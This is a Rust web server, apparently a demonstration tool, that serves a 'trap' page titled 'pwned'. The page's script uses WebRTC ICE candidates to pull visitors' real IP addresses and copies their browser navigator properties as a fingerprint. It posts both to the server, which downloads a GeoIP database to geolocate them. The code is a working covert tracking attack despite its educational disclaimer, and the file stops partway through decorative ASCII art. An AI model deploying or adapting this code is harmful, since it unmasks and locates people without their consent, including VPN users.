/**
 * ( LEGAL DISCLAIMER )
 *
 * THE CONTENT HEREIN IS PRESENTED SOLELY FOR EDUCATIONAL AND INFORMATIONAL
 * PURPOSES, DEVOID OF ANY WARRANTIES, GUARANTEES, OR CONDITIONS. IT MAY NOT BE
 * ACCURATE, UP-TO-DATE, OR COMPREHENSIVE. ANY UTILIZATION OR RELIANCE ON THE
 * CONTENT OR MATERIALS PROVIDED, MENTIONED, OR LINKED HERE IS UNDERTAKEN AT
 * YOUR OWN RISK, AND THE AUTHOR(S) DISCLAIM ANY LIABILITY OR RESPONSIBILITY.
 *
 * THE CODE WITHIN THIS REPOSITORY IS INTENDED EXCLUSIVELY FOR ACADEMIC AND
 * EDUCATIONAL PURPOSES. ANY MALICIOUS USE OF THIS SOFTWARE IS THE LEGAL
 * LIABILITY AND ETHICAL RESPONSIBILITY OF THE END USER. UTILIZING THIS TOOL FOR
 * UNAUTHORIZED ATTACKS ON TARGETS IS ILLEGAL, AND THE END USER IS REQUIRED TO
 * ADHERE TO ALL APPLICABLE LOCAL, STATE, AND FEDERAL LAWS. THE AUTHOR(S) BEAR
 * NO LIABILITY AND DISCLAIM RESPONSIBILITY FOR ANY MISUSE OR DAMAGE RESULTING
 * FROM THE UTILIZATION OF THIS PROGRAM OR THE PROVIDED CONTENT.
 *
 * FOR THE DETAILED USAGE LICENSE, KINDLY CONSULT THE ACCOMPANYING LICENSE
 * BELOW.
 *
 * (The MIT License)
 *
 * Copyright (c) 2024 Mamadou Babaei
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
use std::fs;
use std::fs::File;
use std::io;
use std::net::IpAddr;
use std::path::PathBuf;
use std::process;
use std::str::FromStr;

use parking_lot::Mutex;

use clap::Parser;
use regex::Regex;

use tempfile::TempDir;
use url::Url;

use maxminddb::{geoip2, MaxMindDBError};

use actix_web::{web, App, HttpRequest, HttpResponse, HttpServer};

const VERSION: &str = git_version::git_version!();

#[derive(Parser, Debug)]
#[command(author, version = VERSION, about = "A WebRTC IP Leak Vulnerability Demonstration", long_about = None)]
struct Args {
    #[arg(long, default_value = "0.0.0.0")]
    host: String,

    #[arg(long, default_value_t = 9999, value_parser = clap::value_parser ! (u16).range(0..65536))]
    port: u16,

    #[arg(long, default_value = "stun:stun.l.google.com:19302")]
    stun_server: String,

    #[arg(
        long,
        default_value = "https://github.com/P3TERX/GeoLite.mmdb/releases/latest/download/GeoLite2-City.mmdb"
    )]
    geoip2_url: String,
}

struct AppData {
    stun_server: String,
    geoip2_database_path: String,
}

#[derive(serde::Deserialize)]
struct RecordLeakedIpsRequest {
    username: Option<String>,
    fingerprint: Option<String>,
    leaked_ips: Option<Vec<String>>,
}

struct GeoData {
    country: String,
    city: String,
    postal_code: String,
    time_zone: String,
    latitude: String,
    longitude: String,
    accuracy_radius: String,
    metro_code: String,
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let args = Args::parse();

    if let Err(err) = validate_host(args.host.as_str()) {
        eprintln!("Host validation has failed: {err}");
        process::exit(1);
    }

    if let Err(err) = validate_stun_server(args.stun_server.as_str()) {
        eprintln!("Host validation has failed: {err}");
        process::exit(1);
    }

    let temp_dir = TempDir::new().expect("Failed to create the temporary directory!");
    let temp_dir_path = temp_dir.path().to_owned();
    let geoip2_database_url =
        Url::parse(args.geoip2_url.as_str()).expect("Failed to parse the GeoIP2 database URL!");
    let geoip2_database_name = geoip2_database_url
        .path_segments()
        .and_then(std::iter::Iterator::last)
        .expect("Failed to extract the GeoIP2 database name from the provided URL!");
    let geoip2_database_path = temp_dir_path.join(geoip2_database_name);
    let geoip2_database_path_str = geoip2_database_path
        .to_str()
        .expect("Failed to get the GeoIP2 database path as a string!");

    match download_geoip2_database(args.geoip2_url.as_str(), &geoip2_database_path).await {
        Ok(()) => {
            println!("The GeoIP2 database has been successfully stored into '{geoip2_database_path_str}'!", );
        }
        Err(error) => {
            eprintln!("Downloading the GeoIP2 database has failed: {error}");
            process::exit(1);
        }
    }

    println!("Will be using the STUN server: {}...", args.stun_server);
    println!("Listing on {}:{}...", args.host, args.port);

    let app_data = web::Data::new(Mutex::new(AppData {
        stun_server: args.stun_server.clone(),
        geoip2_database_path: geoip2_database_path_str.to_string(),
    }));

    HttpServer::new(move || {
        App::new()
            .app_data(app_data.clone())
            .service(web::resource("/record_leaked_ips").route(web::post().to(record_leaked_ips)))
            .service(web::resource("/").route(web::get().to(index)))
    })
    .bind(format!("{}:{}", args.host, args.port).as_str())?
    .run()
    .await
}

fn validate_host(host: &str) -> Result<(), String> {
    let host_regex = Regex::new(r"^(localhost|(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}|(?:\d{1,3}\.){3}\d{1,3})$").unwrap();
    if host_regex.is_match(host) {
        Ok(())
    } else {
        Err("invalid host format!".to_string())
    }
}

fn validate_stun_server(stun_server: &str) -> Result<(), String> {
    let stun_server_regex = Regex::new(r"^stun:[a-zA-Z0-9.-]+:\d+$").unwrap();
    if stun_server_regex.is_match(stun_server) {
        Ok(())
    } else {
        Err("invalid STUN server format!".to_string())
    }
}

async fn download_geoip2_database(
    url: &str,
    download_path: &PathBuf,
) -> Result<(), Box<dyn std::error::Error>> {
    let download_path_str = download_path
        .to_str()
        .expect("Failed to get the GeoIP2 database path as a string!");

    println!("Checking whether '{download_path_str}' exist or not...");

    if fs::metadata(download_path_str).is_ok() {
        println!("'{download_path_str}' exists!");
        let is_dir = fs::metadata(download_path_str)?.is_dir();
        if is_dir {
            fs::remove_dir_all(download_path_str)?;
        } else {
            fs::remove_file(download_path_str)?;
        }
        println!("Existing '{download_path_str}' has been removed!");
    } else {
        println!("'{download_path_str}' does not exist!");
    }

    println!("Retrieving GeoIP2 database from '{url}' into '{download_path_str}'...");

    let client = reqwest::Client::new();

    let response = client.get(url).send().await?;
    if !response.status().is_success() {
        return Err(format!("{}", response.status()).into());
    }

    let mut database_file = File::create(download_path)?;
    io::copy(&mut response.bytes().await?.as_ref(), &mut database_file)?;

    Ok(())
}

fn get_geo_data(database_path: &str, ip: &str) -> GeoData {
    let mut country: String = String::from("Unknown");
    let mut city: String = String::from("Unknown");
    let mut postal_code: String = String::from("Unknown");
    let mut time_zone: String = String::from("Unknown");
    let mut latitude: String = String::from("Unknown");
    let mut longitude: String = String::from("Unknown");
    let mut accuracy_radius: String = String::from("Unknown");
    let mut metro_code: String = String::from("Unknown");

    let reader = maxminddb::Reader::open_readfile(database_path)
        .unwrap_or_else(|_| panic!("Failed to read the GeoIP2 database file '{database_path}'!"));
    let ip_addr = IpAddr::from_str(ip)
        .unwrap_or_else(|_| panic!("Failed to construct a IpAddr from the IP '{ip}'!"));

    let lookup_result: Result<geoip2::City, MaxMindDBError> = reader.lookup(ip_addr);
    if let Ok(db) = lookup_result {
        let country_option = db
            .country
            .and_then(|c| c.names.and_then(|n| n.get("en").copied()));
        if let Some(value) = country_option {
            country = String::from(value);
        }

        let city_option = db
            .city
            .and_then(|c| c.names.and_then(|n| n.get("en").copied()));
        if let Some(value) = city_option {
            city = String::from(value);
        }

        let postal_code_option = db.postal.and_then(|p| p.code.map(String::from));
        if let Some(value) = postal_code_option {
            postal_code = value;
        }

        let time_zone_option = db
            .location
            .clone()
            .and_then(|p| p.time_zone.map(String::from));
        if let Some(value) = time_zone_option {
            time_zone = value;
        }

        let latitude_option = db.location.clone().and_then(|p| p.latitude);
        if let Some(value) = latitude_option {
            latitude = format!("{value}");
        }

        let longitude_option = db.location.clone().and_then(|p| p.longitude);
        if let Some(value) = longitude_option {
            longitude = format!("{value}");
        }

        let accuracy_radius_option = db.location.clone().and_then(|p| p.accuracy_radius);
        if let Some(value) = accuracy_radius_option {
            accuracy_radius = format!("{value}");
        }

        let metro_code_option = db.location.clone().and_then(|p| p.metro_code);
        if let Some(value) = metro_code_option {
            metro_code = format!("{value}");
        }
    }

    GeoData {
        country,
        city,
        postal_code,
        time_zone,
        latitude,
        longitude,
        accuracy_radius,
        metro_code,
    }
}

#[allow(clippy::too_many_lines)]
async fn index(app_data: web::Data<Mutex<AppData>>, request: HttpRequest) -> HttpResponse {
    let username = request
        .uri()
        .query()
        .and_then(|query| {
            let params: Vec<_> = serde_urlencoded::from_str(query).unwrap();
            params
                .into_iter()
                .find(|(key, _): &(String, String)| key == "u")
                .map(|(_, value)| value)
        })
        .unwrap_or_else(|| String::from("{UNKNOWN_USER}"));

    println!("Setting up the trap for user: {username}...");

    let html_content = format!(
        r"
<html>
  <head>
    <title>.:: pwned ::.</title>
    <script>
      const regexIPv4 = /\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){{3}}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/;
      const regexIPv6 = /\b(?:[A-F0-9]{{1,4}}:){{7}}[A-F0-9]{{1,4}}\b/i;

      const leakIPs = (timeout = 100) => {{
        const leakedIPs = new Set();

        const onicecandidate = (ice) => {{
          const candidate = ice?.candidate?.candidate;

          if (candidate) {{
            for (const regex of [regexIPv4, regexIPv6]) {{
              const [ip] = candidate.match(regex) || [];
              if (ip) {{
                leakedIPs.add(ip);
              }}
            }}
          }}
        }};

        return new Promise((resolve, reject) => {{
          const RTCPeerConnection =
            window.RTCPeerConnection ||
            window.mozRTCPeerConnection ||
            window.webkitRTCPeerConnection;

          const connection = new RTCPeerConnection({{
            iceServers: [
              {{
                urls: '{stun_server}',
              }},
            ],
          }});

          connection.addEventListener('icecandidate', onicecandidate);
          connection.createDataChannel('');
          connection.createOffer().then((offer) => connection.setLocalDescription(offer), reject);

          setTimeout(() => {{
            try {{
              connection.removeEventListener('icecandidate', onicecandidate);
              connection.close();
            }} catch {{
            }}

            resolve([...leakedIPs]);

            var fingerprint = {{}};
            for (i in navigator) {{
                fingerprint[i] = navigator[i];
            }}

            fetch('/record_leaked_ips', {{
              method: 'POST',
              headers: {{
                'Content-Type': 'application/json',
              }},
              body: JSON.stringify({{
                username: '{username}',
                fingerprint: JSON.stringify(fingerprint),
                leaked_ips: [...leakedIPs],
              }}),
            }});

          }}, timeout);
        }});
      }};

      leakIPs();
    </script>
  </head>
  <body>
    <h1>Hello, {username}! You've just got pwned ;) </h1>
    <div style='font-family: monospace; white-space: pre; font-size: 10px;'>
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10436;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10484;&#10431;&#10311;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10424;&#10359;&#10436;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10400;&#10366;&#10241;&#10424;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10424;&#10311;&#10265;&#10407;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10480;&#10335;&#10240;&#10240;&#10367;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10264;&#10311;&#10240;&#10264;&#10423;&#10308;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10416;&#10335;&#10240;&#10240;&#10240;&#10311;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10311;&#10240;&#10240;&#10264;&#10487;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10368;&#10495;&#10241;&#10240;&#10240;&#10240;&#10407;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10311;&#10240;&#10240;&#10240;&#10265;&#10487;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10492;&#10319;&#10240;&#10240;&#10240;&#10240;&#10488;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10416;&#10311;&#10240;&#10240;&#10240;&#10240;&#10495;&#10311;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10495;&#10243;&#10240;&#10240;&#10240;&#10240;&#10296;&#10311;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10468;&#10468;&#10484;&#10486;&#10367;&#10303;&#10267;&#10267;&#10267;&#10267;&#10267;&#10267;&#10267;&#10267;&#10267;&#10299;&#10294;&#10486;&#10468;&#10436;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10488;&#10241;&#10240;&#10240;&#10240;&#10240;&#10425;&#10495;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10495;&#10308;&#10240;&#10240;&#10240;&#10240;&#10240;&#10425;&#10308;&#10240;&#10240;&#10464;&#10484;&#10495;&#10267;&#10251;&#10249;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10248;&#10299;&#10495;&#10495;&#10495;&#10468;&#10304;&#10240;&#10240;&#10480;&#10247;&#10240;&#10240;&#10240;&#10240;&#10240;&#10424;&#10495;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10495;&#10311;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10265;&#10258;&#10300;&#10495;&#10495;&#10431;&#10487;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10265;&#10495;&#10495;&#10495;&#10495;&#10358;&#10266;&#10241;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10494;&#10367;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10427;&#10495;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10427;&#10319;&#10240;&#10431;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10425;&#10495;&#10495;&#10495;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10495;&#10243;&#10240;&#10240;&#10240;&#10240;
      &#10494;&#10240;&#10240;&#10240;&#10248;&#10495;&#10439;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10264;&#10495;&#10240;&#10424;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10494;&#10495;&#10495;&#10243;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10494;&#10367;&#10240;&#10240;&#10240;&#10368;&#10484;
      &#10495;&#10471;&#10240;&#10240;&#10240;&#10296;&#10495;&#10438;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10495;&#10308;&#10296;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10468;&#10494;&#10495;&#10495;&#10495;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10488;&#10495;&#10241;&#10240;&#10240;&#10368;&#10494;&#10319;
      &#10495;&#10495;&#10487;&#10304;&#10240;&#10240;&#10297;&#10495;&#10438;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10480;&#10495;&#10243;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10468;&#10468;&#10468;&#10468;&#10486;&#10495;&#10367;&#10271;&#10495;&#10495;&#10495;&#10495;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10492;&#10495;&#10243;&#10240;&#10240;&#10464;&#10495;&#10495;&#10311;
      &#10495;&#10329;&#10431;&#10495;&#10470;&#10304;&#10240;&#10296;&#10495;&#10487;&#10436;&#10432;&#10240;&#10240;&#10484;&#10495;&#10335;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10264;&#10431;&#10495;&#10495;&#10471;&#10304;&#10240;&#10240;&#10240;&#10464;&#10494;&#10367;&#10241;&#10240;&#10368;&#10484;&#10495;&#10335;&#10425;&#10311;
      &#10425;&#10311;&#10240;&#10299;&#10495;&#10495;&#10438;&#10304;&#10424;&#10495;&#10495;&#10495;&#10495;&#10495;&#10303;&#10251;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10436;&#10240;&#10240;&#10240;&#10240;&#10248;&#10267;&#10303;&#10431;&#10495;&#10486;&#10486;&#10494;&#10495;&#10495;&#10241;&#10368;&#10484;&#10495;&#10495;&#10251;&#10240;&#10424;&#10241;
      &#10296;&#10495;&#10240;&#10240;&#10265;&#10431;&#10495;&#10487;&#10493;&#10495;&#10495;&#10495;&#10367;&#10241;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10364;&#10243;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10264;&#10439;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10249;&#10249;&#10425;&#10495;&#10495;&#10484;&#10494;&#10495;&#10271;&#10241;&#10240;&#10240;&#10494;&#10240;
      &#10240;&#10495;&#10304;&#10240;&#10240;&#10240;&#10265;&#10431;&#10495;&#10495;&#10495;&#10495;&#10311;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10464;&#10366;&#10241;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10264;&#10407;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10296;&#10495;&#10495;&#10495;&#10367;&#10251;&#10240;&#10240;&#10240;&#10240;&#10495;&#10240;
      &#10240;&#10297;&#10487;&#10240;&#10240;&#10240;&#10240;&#10248;&#10493;&#10495;&#10495;&#10495;&#10471;&#10240;&#10240;&#10240;&#10240;&#10240;&#10276;&#10270;&#10249;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10265;&#10290;&#10278;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10427;&#10495;&#10319;&#10240;&#10240;&#10240;&#10240;&#10240;&#10480;&#10243;&#10240;
      &#10240;&#10240;&#10431;&#10471;&#10304;&#10240;&#10240;&#10240;&#10495;&#10495;&#10495;&#10495;&#10495;&#10436;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10304;&#10240;&#10240;&#10296;&#10495;&#10311;&#10240;&#10240;&#10240;&#10240;&#10432;&#10271;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10265;&#10431;&#10470;&#10432;&#10240;&#10425;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10486;&#10470;&#10436;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10464;&#10358;&#10266;&#10249;&#10241;&#10240;&#10240;&#10240;&#10495;&#10311;&#10240;&#10240;&#10368;&#10358;&#10251;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10265;&#10431;&#10487;&#10494;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10363;&#10406;&#10432;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10464;&#10294;&#10427;&#10495;&#10241;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10424;&#10311;&#10432;&#10356;&#10251;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10249;&#10427;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10487;&#10304;&#10248;&#10267;&#10406;&#10432;&#10432;&#10432;&#10494;&#10240;&#10240;&#10240;&#10240;&#10495;&#10436;&#10432;&#10432;&#10356;&#10251;&#10241;&#10400;&#10495;&#10255;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10492;&#10335;&#10249;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10248;&#10495;&#10495;&#10495;&#10495;&#10495;&#10271;&#10251;&#10249;&#10249;&#10267;&#10303;&#10294;&#10294;&#10267;&#10249;&#10249;&#10299;&#10495;&#10308;&#10240;&#10240;&#10416;&#10495;&#10255;&#10249;&#10249;&#10267;&#10294;&#10294;&#10271;&#10249;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10416;&#10367;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10264;&#10495;&#10495;&#10495;&#10471;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10495;&#10439;&#10240;&#10240;&#10492;&#10495;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10400;&#10367;&#10243;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10264;&#10299;&#10495;&#10495;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10297;&#10495;&#10240;&#10240;&#10495;&#10495;&#10308;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10432;&#10484;&#10271;&#10241;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10297;&#10495;&#10308;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10464;&#10340;&#10240;&#10240;&#10299;&#10240;&#10240;&#10495;&#10495;&#10487;&#10468;&#10432;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10492;&#10495;&#10243;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10495;&#10495;&#10470;&#10468;&#10432;&#10432;&#10432;&#10468;&#10356;&#10431;&#10495;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10495;&#10495;&#10495;&#10495;&#10495;&#10259;&#10470;&#10468;&#10432;&#10432;&#10464;&#10468;&#10486;&#10495;&#10335;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10425;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10479;&#10304;&#10240;&#10265;&#10267;&#10423;&#10304;&#10240;&#10240;&#10240;&#10424;&#10495;&#10271;&#10267;&#10249;&#10240;&#10400;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10495;&#10247;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10424;&#10495;&#10495;&#10329;&#10303;&#10303;&#10251;&#10427;&#10265;&#10438;&#10240;&#10240;&#10240;&#10423;&#10436;&#10240;&#10368;&#10472;&#10335;&#10240;&#10240;&#10368;&#10364;&#10379;&#10319;&#10427;&#10495;&#10271;&#10465;&#10495;&#10495;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10495;&#10495;&#10495;&#10308;&#10240;&#10240;&#10424;&#10359;&#10476;&#10355;&#10406;&#10468;&#10468;&#10440;&#10441;&#10441;&#10433;&#10464;&#10468;&#10356;&#10379;&#10356;&#10430;&#10243;&#10240;&#10240;&#10468;&#10495;&#10495;&#10367;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
